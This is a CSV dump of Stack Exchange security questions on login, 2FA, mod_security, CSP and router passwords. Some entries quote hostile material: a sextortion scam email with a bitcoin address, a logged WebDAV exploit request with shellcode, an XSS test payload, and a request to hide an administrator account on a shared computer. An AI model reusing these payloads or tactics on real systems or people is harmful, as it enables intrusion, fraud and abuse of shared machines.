Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate,ContentLicense
"206262","1","206273","","2019-03-27 20:30:41","","1","128","<p>I have a SaaS app (App), and it has established SAML trust relationships with two of our clients, Acme and Foo.</p>

<p>Acme users log in to App through an IdP-initiated flow. Foo users also log in to App through an IdP-initiated flow. Accounts in App are identified by email address, say jdoe@acme.com and rsmith@foo.com.</p>

<p>A bad actor at Acme decides to create an account in their IdP identified by rsmith@foo.com. Then the bad actor tries to sign in to App with that account (an account called ""rsmith@foo.com"" that lives in Acme's IdP). How do I prevent that?</p>

<p>In other words, I want the trust relationship between App and Acme to be limited only to accounts @acme.com, and the trust relationship between App and Foo to be limited only to accounts @foo.com.</p>

<p>In other other words, if Acme's IdP tries to authenticate a user that ""belongs"" to Foo's IdP, then I don't want to authenticate that user.</p>
","47378","","","","","2019-03-28 00:58:43","SAML Security Question","<account-security><saml>","1","0","","","","CC BY-SA 4.0"
"206319","1","","","2019-03-28 16:57:18","","2","2404","<p>So, today I received an email in my Gmail account which landed automatically in the spam folder. This was the email content:</p>

<blockquote>
  <p>Hi!</p>
  
  <p>As you may have noticed, I sent you an email from your account. This
  means that I have full access to your account: At the time of hacking
  your account(d*****@gmail.com) had this password: ******* (not revealed by me intentionally here)</p>
  
  <p>You can say: this is my, but old password! Or: I can change my
  password at any time!</p>
  
  <p>Of course! You will be right, but the fact is that when you change the
  password, my malicious code every time saved a new one!</p>
  
  <p>I've been watching you for a few months now. But the fact is that you
  were infected with malware through an adult site that you visited.</p>
  
  <p>If you are not familiar with this, I will explain. Trojan Virus gives
  me full access and control over a computer or other device. This means
  that I can see everything on your screen, turn on the camera and
  microphone, but you do not know about it.</p>
  
  <p>I also have access to all your contacts and all your correspondence
  from e-mail and messengers.</p>
  
  <p>Why your antivirus did not detect my malware? Answer: My malware uses
  the driver, I update its signatures every 4 hours so that your
  antivirus is silent.</p>
  
  <p>I made a video showing how you satisfy yourself in the left half of
  the screen, and in the right half you see the video that you watched.
  With one click of the mouse, I can send this video to all your emails
  and contacts on social networks. I can also post access to all your
  e-mail correspondence and messengers that you use.</p>
  
  <p>If you want to prevent this, transfer the amount of $770 to my bitcoin
  address (if you do not know how to do this, write to Google: ""Buy
  Bitcoin"").</p>
  
  <p>My bitcoin address (BTC Wallet) is: 1GB22WpNfFPcAYnad1Sd3qWoVJeDbtN72M</p>
  
  <p>After receiving the payment, I will delete the video and you will
  never hear me again. I give you 48 hours to pay. I have a notice
  reading this letter, and the timer will work when you see this letter.</p>
  
  <p>Filing a complaint somewhere does not make sense because this email
  cannot be tracked like my bitcoin address. I do not make any mistakes.</p>
  
  <p>If I find that you have shared this message with someone else, the
  video will be immediately distributed. Bye!</p>
</blockquote>

<p>Now, here are the few things I observed:</p>

<ul>
<li>under from, my email address was written.</li>
<li>under to, that password (which is mentioned in the email) and my email address mentioned inside angular quotes.</li>
</ul>

<p>Although that password which was mentioned in the email was my password around 4-5 years ago and I'm also not sure that whether it belongs to my Gmail account or some other account.</p>

<p>Now, my question is what should I do to tackle this situation? Should I simply ignore this email or report to Google or do something else? Please advise as I'm a bit worried on seeing this email.</p>

<p><strong>Edit: I have changed my current account password as a security measure.</strong></p>
","189828","","189828","","2019-03-28 17:06:10","2019-03-28 17:09:33","Should I be worried by an email which said my account was under attack?","<malware><attacks><attack-prevention><account-security><gmail>","1","3","","2019-03-28 17:41:20","","CC BY-SA 4.0"
"206389","1","","","2019-03-29 16:04:32","","0","301","<p>I am aware of some of the main competitors in this space, including: Lavabit, Countermail, Fastmail, Proton.  But, I don't have enough knowledge to differentiate them.  Along the same line, I don't think I truly understand what Lavabit does.  It seems like it is more of a sophisticated third party encryption system than a true user friendly email system.</p>

<p>Although I am somewhat concerned about privacy, my main concern is security.  I don't want to be tracked by google ad text as I am when I use my current gmail.  And, I feel like that renders me vulnerable not only to ads, pop ups, videos but also outright spamware, bugs, etc.  I recently suffered a related attack.  And, I want to reduce my risk along those lines.  </p>
","202703","","202703","","2019-03-29 17:10:23","2019-03-29 20:22:52","Are email systems like Countermail safe?","<privacy><email><account-security>","3","0","","","","CC BY-SA 4.0"
"139499","1","","","2016-10-12 00:20:50","","1","159","<p>I am  a little confused about the definition of two factor authentication. Does a login method containing a hardware generated pin and SMS verification constitute two factor authentication?</p>
","127193","","98538","","2016-10-12 13:53:33","2016-10-12 13:53:33","Does a hardware generated pin plus SMS verification count as two factor authentication?","<authentication><multi-factor><account-security>","2","1","","","","CC BY-SA 3.0"
"206594","1","206597","","2019-04-02 02:52:49","","10","586","<p>As shown in this <a href=""https://meta.stackexchange.com/questions/17443/how-is-the-default-user-avatar-generated"">question</a>, default user avatars (like mine) are identicons and are generated with the user's email (where provided) or the user's IP address (where the email is <em>not</em> provided).</p>

<p>Given any identicon and information of whether it was generated from an email or IP address, can the email or IP address be identified? <strong>If yes</strong>, post my email in a spoiler (I registered an email with my account). <strong>If no</strong>, provide reasoning why.</p>
","","user203478","106285","","2019-04-02 04:02:32","2021-03-21 02:16:52","Is it possible to ""reverse engineer"" identicons?","<account-security><identity>","1","0","","","","CC BY-SA 4.0"
"206618","1","","","2019-04-02 09:28:33","","1","120","<p>I've noticed a trend in how big companies (Amazon, Skype, and a few others I don't remember in particular) handle e-mail authentication.</p>

<p>Rather than e-mailing clickable links with some single-use token, they've switched to short/readable security codes, which the user is expected to manually highlight, copy, and paste into a textfield on the page.</p>

<p>I can think of two motivations behind this change:</p>

<ol>
<li>A clickable link causes a ""discontinuous"" user experience. The user navigates around on one page, causes a recovery e-mail to be sent, but clicking the link opens a new tab while the previous one still lingers</li>
<li>For security: to train users not to click links in e-mails sent by these companies</li>
</ol>

<p>Is it one of these two reasons? Is it something else? Is there any literature that compares the two techniques?</p>
","70311","","","","","2019-04-02 09:28:33","Authentication: E-mailing security codes vs clickable links","<authentication><email><account-security><account-lockout>","0","2","","","","CC BY-SA 4.0"
"139650","1","","","2016-10-13 10:55:14","","0","229","<p>Almost everyday some media outlet reports that a bunch of accounts have been pasted on the internet and some of them include both email-id and password. But I don't understand how this is useful. Even if you know the email-id and password you can't just login since gmail by default will prevent suspicious logins, so whats the point of making them public? Like what are hackers trying to achieve?</p>
","127378","","98538","","2016-10-13 11:00:21","2016-10-13 11:07:16","Whats the point of publishing Gmail password lists?","<email><gmail><account-security>","1","3","","","","CC BY-SA 3.0"
"206657","1","","","2019-04-03 00:00:40","","1","327","<p>There are a number of apps which ask for storage permission in Android. However it is unclear exactly what parts of storage are they able to access with this permission. As an example, would an app granted storage permission be able to access:</p>

<ol>
<li>Photos</li>
<li>Files in Dropbox</li>
<li>Files in Google Drive</li>
<li>Any file, photo or document anywhere on the phone</li>
</ol>

<p>I thought Android was sandboxing apps which would imply that an app should at least not be able to access personal files under Dropbox as an example. </p>

<p>What parts of the directory does storage permission give access to?</p>
","186651","","186651","","2019-04-11 22:55:01","2019-04-11 22:55:01","Android storage permission","<android><account-security>","0","0","","","","CC BY-SA 4.0"
"70613","1","70619","","2014-10-14 00:10:33","","11","4105","<p>I've been doing some reading about YubiKey (for example <a href=""https://security.stackexchange.com/questions/17922/what-is-a-yubi-key-and-how-does-it-work"">What is a Yubi key and how does it work?</a>) and found the information to be incomplete. It's my understanding, that when the user is prompted to answer a password, all they have to do is plug the YubiKey into a USB port and press its button and then it automatically types out a password into the active text field.</p>

<p><strong>Point 1)</strong><br>
According to <a href=""http://www.linuxjournal.com/magazine/yubikey-one-time-password-authentication"" rel=""nofollow noreferrer"">Linux Journal</a> </p>

<blockquote>
  <p>Each time you press the button on the device, it generates a one-time
  password and sends it to the host machine as if you had entered it on
  a keyboard.  </p>
</blockquote>

<p>So if it's a different password each time what good does that do?</p>

<p><strong>Point 2)</strong><br>
Is it any more secure than using any USB key with a key file on it?</p>

<p><strong>Point 3)</strong><br>
From <a href=""http://www.yubico.com/support/faq/"" rel=""nofollow noreferrer"">Yubico</a> it's not possible to backup the device so if you lose it or break it you're in trouble (in this sense a regular key file is much better).</p>

<p><strong>Point 4)</strong><br>
I've <a href=""https://security.stackexchange.com/questions/45366/how-does-yubikey-protects-its-secret-key"">read</a> that it's not susceptible to malware copying the key, but I don't believe this. If it acts like a keyboard, what's stopping a keylogger from intercepting the keystrokes? </p>

<p><strong>Point 5)</strong><br>
Yubikey is <a href=""https://developers.yubico.com/"" rel=""nofollow noreferrer"">open source</a>. Does it matter since it's primarily a hardware device?</p>

<p><strong>Point 6)</strong><br>
If it does just enter a password, how is this different than just having another password written down or memorized?</p>
","10714","","-1","","2017-03-17 13:14:43","2014-10-14 02:59:43","What is the purpose of yubikey","<security-theater><yubikey>","2","3","","","","CC BY-SA 3.0"
"1809","1","1810","","2011-01-21 21:02:51","","7","1803","<p>I've been playing with mod_security for some time and I'd like somehow to use it in my master thesis. I don't know exactly how this work could be more interesting than describing what mod_security does, what kind of web attacks can be prevented using it, what are other functions of it (like analysing if the requests are really HTTP, analysing XML). I'd rather not focus on this particular tool, but create some system that would secure for example some specific kinds of websites. 
What could make it more reaserch-like? Any hints please?</p>
","1167","","665","","2011-04-01 21:48:50","2011-04-03 03:22:49","Master thesis topic - mod_security","<research><apache><waf><mod-security>","5","2","","","","CC BY-SA 2.5"
"1811","1","1813","","2011-01-21 23:31:48","","11","1850","<p>I have read extremely mixed opinions on the process of chrooting for a web server (non-shared environment). Some people swear by it, yet others say that it isn't as secure as everyone says.</p>

<p>Given that chrooting can be difficult and time consuming to implement and maintain, on a non-shared server do you Chroot? Why/Why not?</p>

<p>If you do, do you use a module such as mod_security?</p>

<p>If you don't, do you do anything else to the server that accomplishes the same goal?</p>
","1158","","665","","2011-04-01 21:49:27","2011-04-01 21:49:27","Relative importance of CHROOT for web servers","<webserver><linux><mod-security>","1","0","","","","CC BY-SA 2.5"
"70704","1","","","2014-10-14 20:14:13","","0","233","<p>I just came across this:</p>

<p><a href=""https://blog.webmaker.org/one-less-password"" rel=""nofollow"">https://blog.webmaker.org/one-less-password</a></p>

<p>Basically a technique for eliminating passwords as the primary authentication mechanism for connecting to a website by replacing it with your mobile device.</p>

<p>In the technical sense is this a more secure system or does it increase vulnerability because it now centralizes the location access is granted via (ie loose you mobile device and now access to your accounts is protected by a 4 digit pin).</p>
","4600","","54284","","2014-10-14 20:36:43","2014-10-14 22:17:25","One Less Password","<passwords><security-theater>","3","4","","","","CC BY-SA 3.0"
"206941","1","","","2019-04-06 22:58:47","","0","107","<p>For a reason I can't fathom, people seem to subscribe to the opinion that a secret username isn't more secure than a public one. I find this opinion completely ludicrous and would like to know why this dogma has continued for so long.</p>

<p>If an authentication system depends on a secret password to authenticate, wouldn't logic dictate that a secret username would be twice as secure?</p>

<p>My opinion is that, if a username is treated by both the user and authentication system as a password then, by definition, it IS a password; the first in a series of two.</p>

<p>What caused this confusion and frustration is a question I posted elsewhere. I asked if it were possible to separate an email user's address from the username during authentication. The logic being that if a hacker needed to brute the username along with the password for a targeted attack, it could take twice the effort to succeed.</p>

<p>What logic could you possibly provide to prove that a username is not a password if it is treated as such (aka a secret)?</p>

<p>This question concerns only this specific attack vector and not any other related ones like social engineering, system vulnerabilities, etc.</p>

<p>UPDATE: This question is not a duplicate of another question because it asks a completely different question:
""would like to know why this dogma has continued for so long"" in the first paragraph. The other questions are only included to provide support for the main one and to offer the Answer-er a vehicle for supporting their answer.</p>

<p>UPDATE: I get it - with an authentication system that does not intend to keep a username secret (ie reveals if a username is valid or not) is not more secure than a password of double length). My question targets an authentication system that DOES treat a username as a 1st password (ie does not reveal the validity of a username).</p>
","","user32227","","user32227","2019-04-07 22:03:40","2019-04-07 22:03:40","Authentication System Usernames","<authentication><account-security>","1","1","","2019-04-18 15:29:14","","CC BY-SA 4.0"
"139949","1","","","2016-10-17 08:15:34","","0","741","<p>I use my office network for snapchat, facebook etc 
My office network uses PEAP as an EAP method.
And uses system certificates while connecting</p>

<p>It requires me to connect to the domain that is my  companyname.com
and then the office provided user credentials.</p>

<p>Is this is a secure connection?Can they see my snaps , chats etc.?</p>

<p>Any help is appreciated.</p>

<p>Thanks.</p>

<p><a href=""https://i.stack.imgur.com/6qjEB.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6qjEB.png"" alt=""enter image description here""></a></p>
","127741","","","","","2016-11-16 12:55:55","Security on a PEAP wifi network on phone","<network><wifi><android><network-scanners><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"207073","1","207076","","2019-04-09 11:41:21","","0","524","<p>I just installed <code>Opera browser v60</code> (i.e. Reborn 3) on <code>Windows 10</code>. I noticed that it has automatically (without my consent and permission) taken all my bookmarks in Google Chrome and added to the bookmarks in the Opera browser. In addition, I noticed that somehow it has got access to my open sessions on Google Chrome. By this, I mean that I could for example open some websites using Opera browser without the need to give my username and password since I was logged into them using in Google Chrome browser (e.g. I did not need to login to <code>stackexchange.com</code>).</p>

<p>This felt creepy and made me think how Opera browser can do this? And in general, should I be worried that this happened and change my usernames and passwords?</p>

<p>At the moment, my idea why this happens is that because both browsers are based on <code>Chromium</code>. But I am not sure if this is the reason.  </p>
","204166","","204166","","2019-04-09 11:54:19","2019-04-09 12:05:51","How can Opera browser access my sessions on Google Chrome?","<web-browser><account-security>","1","0","","","","CC BY-SA 4.0"
"140152","1","","","2016-10-19 02:45:37","","1","1533","<p>I travel a lot. When I am away from home, I connect to the internet using a mobile hotspot provided by a major ISP in the US. I am the only one who uses this computer and this hotspot, both of which I own.</p>

<p>Assuming my ISP has not been compromised how hard would it be for an unsavory person be able to intercept or view my internet traffic? Are there any ways to make the system more secure?</p>
","127923","","","","","2016-10-19 05:08:59","Mobile hotspot security","<privacy><wifi><account-security>","2","1","","","","CC BY-SA 3.0"
"207137","1","","","2019-04-10 07:57:25","","1","2076","<p>I use Refresh Token to handling expired Access Token, and in log out, I can remove Refresh Token from the database. Refresh Token must never expire (not sure) because the user can check ""remember me"".</p>

<p>So why should I use <code>jwt</code> in Refresh Token? Can it be just a random hash string? And should it have expiration time?</p>
","102796","","","","","2019-04-11 04:30:17","Why should I use jwt in Refresh Token?","<authentication><account-security><jwt>","1","0","","2019-04-17 07:35:05","","CC BY-SA 4.0"
"207139","1","207140","","2019-04-10 08:09:36","","1","150","<p>After my journey for finding a way to <a href=""https://security.stackexchange.com/questions/206157/is-it-possible-to-create-a-truly-private-user-account-in-a-public-computer"">create a truly private user account in a public computer</a> (the setup I'm trying to do this on is detailed in this other question) ended in an epic fail I'm now taking a different approach to the subject: creating a regular admin account (I accept suggestions that require the super administrator account, but I'd like to avoid it) but make finding it extremely hard if you don't know what you're doing/looking after. Interactive logon is enabled on the college computer, so it helps I guess.</p>

<p>I need the account to not show up on the:</p>

<ul>
<li><p>Users folder.</p></li>
<li><p>logon screen (we got interactive logon so this is easy).</p></li>
<li><p>net user command/any user listing.</p></li>
</ul>

<p>These characteristics are the most necessary ones since without them it's possible to come across the account by accident. If you have a suggestion that only fits 1 or 2 of them please don't hesitate to comment, anything helps! Additional coverage/hiding and boring maneuvers like disabling/enabling the account every time I want to use it are welcome too.</p>
","202889","","","","","2019-04-10 08:26:49","How can I create a hidden Administrator account in a public computer?","<account-security><windows-7>","1","0","","","","CC BY-SA 4.0"
"140286","1","","","2016-10-20 07:08:23","","0","377","<p><a href=""https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/master/base_rules/modsecurity_crs_40_generic_attacks.conf"" rel=""nofollow"">OWASP modsecurity</a> rule 950119 for Remote File inclusion blocks the following URL:</p>

<pre><code>https://mydomain.com?myparam=http://mysite.com?&amp;param2=abcd
</code></pre>

<p>What's the issue with having <code>?&amp;</code> in an URL causing it to block <code>?</code>?</p>
","6862","","98538","","2016-10-20 08:54:03","2016-10-20 08:54:03","Why does OWASP modsecurity block remote file inclusion for ?& in URL for Rule 950119","<apache><mod-security>","0","2","","","","CC BY-SA 3.0"
"207253","1","207256","","2019-04-11 15:16:52","","1","272","<p>Some time ago a developer in my team accidentally published some code to his GitHub repository containing ENV_VARS that belonged to our company's SendGrid account. Fortunately I noticed this as soon as he created the repository and it was deleted.</p>

<p>Around 12 hours after this happened, SendGrid locked the company account and mentioned this was done because they found account details in a GitHub repository (the one my developer previously published and subsequently deleted).</p>

<p>This got me thinking: would the ""bot"" that SendGrid uses be searching GitHub with the username/password (in plain text)? If so, then this is a big security issue on their side, right (storing passwords in plain text)? </p>

<p>Even if they were encrypting the password and decrypting the password to search GitHub for exposed credentials, this would still seem unsafe as the password would be exposed to GitHub via a search string parameter.</p>

<p>Here is an example of what the ENV_VARS for the SendGrid account look like:</p>

<pre><code>MAIL_DRIVER=smtp
MAIL_HOST=smtp.sendgrid.net
MAIL_PORT=587
MAIL_USERNAME=username
MAIL_PASSWORD=null
MAIL_ENCRYPTION=tls
</code></pre>
","118122","","","","","2019-04-11 15:40:39","SendGrid Github Account Credentials Scanning","<account-security>","2","0","","","","CC BY-SA 4.0"
"207306","1","207310","","2019-04-12 14:30:52","","0","1046","<p>If a website has a <em>password change</em> functionality where the user isn't prompted for the current password and the form isn't using tokens to mitigate CSRF attacks, an attacker can easily execute a CSRF attack on logged-in users so that the victims are tricked into changing their passwords.</p>

<p>But, given no other flaws on the web application, can the attacker learn the victim's username so that he can actually login with the new password set by the attacker?</p>
","70038","","70038","","2019-04-12 14:37:36","2022-08-02 11:34:17","Can a password change via CSRF lead to account takeover?","<passwords><web-application><csrf><account-security><account-lockout>","3","1","","","","CC BY-SA 4.0"
"140388","1","","","2016-10-21 03:50:29","","4","659","<p>Assume that I will never, <em>ever</em>, forget my (in this case, Google) account password.</p>

<p>With that in mind, is there <strong>any benefit whatsoever</strong> to setting up a recovery email/phone/etc.?  </p>

<p>Or are all of these services only useful in the case of a forgotten password?</p>
","5613","","","","","2016-10-22 17:47:56","Any reason to have a recovery email/phone if I will NOT ever forget my password?","<email><account-security>","3","0","","","","CC BY-SA 3.0"
"207373","1","","","2019-04-14 09:22:19","","0","25","<p>Most of the login pages like Google, Outlook and Yahoo! confirm the username first and then ask for a password instead of confirming the username and password combination altogether. Isn't it less safe to go with the former practice as the intruder can guess the username first and then guess the password? whereas in the later case the intruder has to go with guessing both the options?</p>

<p>Also is there a website where I can find the industrial standards for the login flow?</p>
","204554","","","","","2019-04-14 09:22:19","Security risks in confirming the username instead of confirming the username and password combination","<authentication><passwords><password-cracking><password-policy><account-security>","0","2","","2019-04-14 09:48:26","","CC BY-SA 4.0"
"2537","1","","","2011-03-13 14:43:40","","4","657","<p>I’m using Linux based VPS hosting, and a firewall and mod_sec help to keep most hackers out. However, over the last couple of weeks I noticed several entries in mod_sec showing that an unknown domain was attacked. Does this mean that the VPS is compromised (I do not see any unknown DNS entries) and other domains are getting a free ride, or is it just pointing to a sloppy setup of the VPS server?</p>
","","Evelyn","665","","2011-04-01 21:47:47","2011-04-01 21:47:47","How to improve VPS security?","<operating-systems><webserver><linux><mod-security>","2","2","","","","CC BY-SA 2.5"
"71414","1","","","2014-10-23 07:33:54","","14","3718","<p>I've had a long running conversation with a client where they perform a <a href=""http://www.rapid7.com/db/vulnerabilities/tcp-seq-num-approximation"">Rapid7 security scan</a> which then warns about TCP MD5 checksums missing on port 80. This is what I think I know:</p>

<ul>
<li><a href=""https://www.ietf.org/rfc/rfc2385.txt"">RFC 2385</a> was designed to protect <a href=""http://en.wikipedia.org/wiki/Border_Gateway_Protocol"">BGP</a>, and by extension BGP-type protocols (i.e. long running TCP connections).</li>
<li>BGP uses long-running TCP connections, HTTP does not.</li>
<li>Encryption/IPSec has superseded <a href=""https://www.ietf.org/rfc/rfc2385.txt"">RFC 2385</a> for protecting BGP.</li>
<li>The TCP RST attack is against long running TCP connections because the attack relies on probability.</li>
<li>The impact against resetting a HTTP kept-alive connection is that the next request would restart it.</li>
<li>Most connections transfer data in milliseconds, the window of attack is too small for HTTP to effectively targeted. The attack depends on the window size and bandwidth of the attacker against the server and seem to take seconds even under good conditions according to page 25 of <a href=""http://bandwidthco.com/whitepapers/netforensics/tcpip/TCP%20Reset%20Attacks.pdf"">Slipping in the window: TCP reset attacks</a>)</li>
<li>A web view is typically made up of multiple connections for each connected client making this type of denial of service unattractive compared to alternatives.</li>
<li>Linux (specifically RHEL or Debian) has support for rfc2385 but can't be <em>globally</em> enabled.</li>
<li>Neither NGINX nor Apache has configuration options to open sockets with tcp-md5-checksums enabled.</li>
<li>Even if rfc2385 was active for HTTP, it wouldn't solve a problem, but would increase load on the server. Which is only a minor side point.</li>
</ul>

<p>I've attempted to explain that rfc2385 isn't relevant to web servers, but they are saying it's an issue with TCP which while true, simplifies that it's an attack against a specific <em>nature</em> of the TCP connection.</p>

<p>I've resorted to explaining that neither Apache and nginx can enable what they're asking for. They keep sending me knowledge base documents mentioning Windows, Cisco, NetBSD, BGP, but never anything relating to apache nor nginx.</p>

<p>Beyond the linked documents I've sent them <a href=""http://lwn.net/Articles/81560/"">LWN</a> explaining it:</p>

<blockquote>
  <p>It would be hard to use this technique to shut down a web server; HTTP connections tend to be short-lived to begin with.</p>
</blockquote>

<p>There is a patch available on Windows that fixes the warning which they are sending through as a suggestion, but it's clearly doesn't accomplish anything for linux.</p>

<p>Am I speaking nonsense? What would be your suggestion of getting the client that have security compliance to worry about to get on the same page as me?</p>
","21341","","32976","","2014-10-23 09:17:31","2015-09-22 06:09:06","How can I explain to the client that rfc2385 TCP MD5 Checksums can't be turned on for linux webservers?","<apache><tcp><security-theater><nginx>","3","6","","","","CC BY-SA 3.0"
"207478","1","207531","","2019-04-16 01:07:57","","0","928","<p>I have a Xen VM running Debian Stretch with Apache2 to play around with. I have installed ClamAV and Modsecurity (not doing anything just logging at the moment). I keep getting emails from ClamAV stating that it detects a virus Win.Exploit.Unicode_Mixed-1 in the Modsec log files.</p>

<pre><code>luke@lamp:~$ sudo clamscan -i /var/log/apache2/
/var/log/apache2/modsec_audit.log.7.gz: Win.Exploit.Unicode_Mixed-1 FOUND

----------- SCAN SUMMARY -----------
Known viruses: 6107846
Engine version: 0.100.3
Scanned directories: 1
Scanned files: 60
Infected files: 1
Data scanned: 111.06 MB
Data read: 23.27 MB (ratio 4.77:1)
Time: 42.726 sec (0 m 42 s)
luke@lamp:~$
</code></pre>

<p>I have submitted the file to VirusTotal.com. ClamAV is the only one to detect on the logfile. This has been going on for months now. Freshclam is keeping ClamAV updated as well.</p>

<p>Is there a way an actual log file can be infected? Is there a way to whitelist the rotating logfiles without whitelisting the signature? </p>

<p>But what i really want to know is this; is there a way to find out what is in the log that is triggering the detection?</p>

<p>EDIT: i managed to locate the string in the logfile. it is;</p>

<pre><code>jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB
</code></pre>

<p>Now that I found the string causing the detection, how can I find out what it is supposed to do? It is in the ""If"" line of the log excerpt below.</p>

<pre><code>--0a71b754-A--
[09/Apr/2019:16:10:10 +0800] XKxTYn8AAQEAAGyvyjUAAAAI 202.28.64.1 18716 &lt;local IP of server&gt; 80
--0a71b754-B--
PROPFIND / HTTP/1.1
Host: localhost
Connection: Close
Content-Length: 0
If: &lt;http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇$
</code></pre>

<p>Thanks,</p>

<p>Luke</p>
","204677","","204677","","2019-04-16 11:42:01","2019-04-16 14:04:51","ClamAV detects virus in Modsec Audit logs","<virus><antivirus><logging><mod-security>","1","3","","","","CC BY-SA 4.0"
"207559","1","","","2019-04-16 19:45:00","","1","142","<p>On SIM cards, which are used in mobile telephony, PIN (and PUK) is used. Unlike a password, they are locked after some incorrect attempts to prevent brute force attack. If wrong PIN is entered 3 times, user must enter PUK. When wrong PUK is entered 10 times, SIM card is permanently disabled.</p>

<p>On the website, if wrong PUK is entered 10 times, user must contact customer support to unlock their account. To prevent abuse, user must enter their password first.</p>

<p>Will adding PIN/PUK as second password increase security? Should it be added?</p>
","","user204771","","","","2019-05-16 21:01:41","Will SIM‐like PIN on website as second password increase security","<passwords><password-cracking><account-security><websites>","1","3","","","","CC BY-SA 4.0"
"207823","1","207828","","2019-04-22 11:33:08","","24","10926","<p>Every time I log in to Google with the same MacBook I get this email:</p>

<pre><code>New device signed in to
    example@gmail.com
Your Google Account was just signed in to from a new Mac device. You're getting this email to make sure it was you.
</code></pre>

<p>What do these emails mean exactly? When does Google send out those emails?</p>

<p>I guess I receive those emails because I use a VPN (always same public IP address) and some <a href=""https://www.privacytools.io/browsers/#addons"" rel=""nofollow noreferrer"">privacy plugins</a> in Firefox.</p>
","16066","","1271","","2019-04-24 14:56:39","2021-07-18 03:23:33","False 'Security alert' from Google - every login generates mails from 'no-reply@accounts.google.com'","<google><account-security>","1","3","","","","CC BY-SA 4.0"
"207895","1","208943","","2019-04-23 17:59:12","","10","2659","<p>How does Comcast know my WiFi password? I generated it via KeePass and entered it into my Arris router/cable modem myself, and I bought the router used from a friend. When I went to the account web page, it showed me my password. I changed the password and it instantly showed the new password on the account web page (after refresh).</p>

<p><a href=""https://customer.xfinity.com/#/settings/security"" rel=""noreferrer"">https://customer.xfinity.com/#/settings/security</a></p>

<p><a href=""https://i.stack.imgur.com/8Hzh0.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/8Hzh0.png"" alt=""enter image description here""></a></p>

<ul>
<li>Model:TG862G</li>
<li>Hardware Revision: 5</li>
<li>eMTA &amp; DOCSIS Software Version: 9.1.103M2AM.SIP.PC20.CT</li>
<li>Packet Cable:2.0</li>
</ul>

<p>I did not install any ""Comcast package"" or software or wizard setup program.</p>
","8722","","8722","","2019-04-23 18:53:53","2019-12-13 23:52:37","How does Comcast know my WiFi password?","<passwords><wifi><account-security><router>","4","3","","","","CC BY-SA 4.0"
"3004","1","3007","","2011-04-10 10:50:05","","7","7910","<p>It's been a few years since I mucked around with modsecurity...   </p>

<p>Will simply installing the package with the default rules provide enough validation to prevent any (okay, let's be honest - best we can hope for is ""most"") type of XSS? My assumption is no... and even if we consider only Type I - Reflected XSS.   </p>

<p>What about the <a href=""https://www.owasp.org/index.php/Category%3aOWASP_ModSecurity_Core_Rule_Set_Project"" rel=""nofollow"">Core Rule Set</a>? Is that XSS-proof enough?<br>
If not, what kind of rules are missing, and what should I look to add/customize, maybe on a per-page basis? (uggh...)   </p>

<p>Last part of the question, what about AJAX-heavy apps? How does ModSecurity, and in particular the CRS, handle AJAX requests without blocking them? 
I assume that hoping that it actually manages to parse out the AJAX and validate each parameter seperately would be <strong>too</strong> much to hope for...</p>

<hr>

<p>To clarify, fixing the code to remove all XSS, including input validation and especially contextual output encoding, is <strong>of course</strong> the best way to go, and really the only long-term solution.<br>
However, I was looking for a temporary, ""quick fix"", to pop something in place to protect the app <em>for now</em>, while they go and fix the XSS in the code, and search for more...   </p>
","33","","33","","2011-04-11 05:34:29","2018-08-30 14:56:40","Does default ModSecurity protect enough against XSS?","<appsec><xss><mod-security>","4","0","","","","CC BY-SA 3.0"
"141004","1","141016","","2016-10-26 19:13:40","","9","1626","<p>Is CSP enforced only during initial rendering, meaning there is no continuous coverage after your document loads? Here is an example of what I'm talking about:</p>

<p>Let's say your page, <code>example.com</code>, has some JS that takes the url parameter <code>name</code> and renders it on the page:</p>

<pre><code>&lt;script nonce=""test123""&gt;
$(document).ready(function() {
    $(""#id"").html(nameParameterTakenFromURLWithoutSanitation);
});
&lt;/script&gt;
</code></pre>

<p>If someone visits <code>example.com?name=&lt;script&gt;alert('XSS');&lt;/script&gt;</code>, based on my tests, the script will still execute (popping up the alert) regardless of CSP. Only illegal scripts that exist inside of the initial server response are blocked.  </p>

<p>I'm using a ""strict"" CSP approach using nonces. Here is the policy I'm using:  </p>

<pre><code>object-src 'none';
script-src 'nonce-test123' 'unsafe-inline' 'unsafe-eval' 'strict-dynamic' https: http:;
report-uri http://localhost:8080/csp-collector
</code></pre>

<p>Why is the script not blocked?</p>
","128791","","98538","","2016-10-26 21:42:11","2018-06-19 07:22:03","Is Content Security Policy only enforced during initial rendering?","<xss><javascript><content-security-policy><jquery>","3","7","","","","CC BY-SA 3.0"
"209043","1","209050","","2019-04-26 03:17:01","","2","153","<p>I'm questionning the design and architecture around 2FA/MFA controls while authenticating to services and servers.</p>

<p>On major platforms(*), the end-user is:</p>

<ul>
<li>first prompted for credentials (username/password) - <em>something you know</em></li>
<li>then prompted for the second factor (Push, Time-based token, or Hardware keys) - <em>something you have</em></li>
</ul>

<p>This design allows a hacker to attack/test the password (the first factor).
<em>If a password is successfully compromised (guessed, brute-forced[dict+perm] or sniffed/captured), the second factor would then hopefully prevent malicious access, however the successful password can then be used on other services where 2FA is not enabled (credentials stuffing).</em></p>

<p><strong>Why is the time-based token/push or HW key not used as a first factor and the password as a second factor?</strong></p>

<ol>
<li><p>Is there a specific reason for this FA order (<em>more intuitive to end-users?</em>) </p></li>
<li><p>Other controls are in place to reduce the risk associated to passwords.</p></li>
<li><p>Is it because the developers or security specialists are opting not to redesign the initial login process (risk retention/acceptance)?</p></li>
</ol>

<p>(*) <em>examples include Twitter, Facebook, LinkedIn, Google, microsoft, dropbox, Box Sync, most banks portal...</em></p>
","50130","","","","","2019-04-26 05:10:09","Multi Factor and order of authentication","<authentication><passwords><multi-factor><architecture><security-by-design>","1","2","","2019-04-29 14:10:32","","CC BY-SA 4.0"
"141021","1","","","2016-10-26 22:39:14","","1","194","<p>Imagine the following scenario;<br>
A hacker want to attack a remote PC and take control of it using RAT. This PC has three user accounts. 
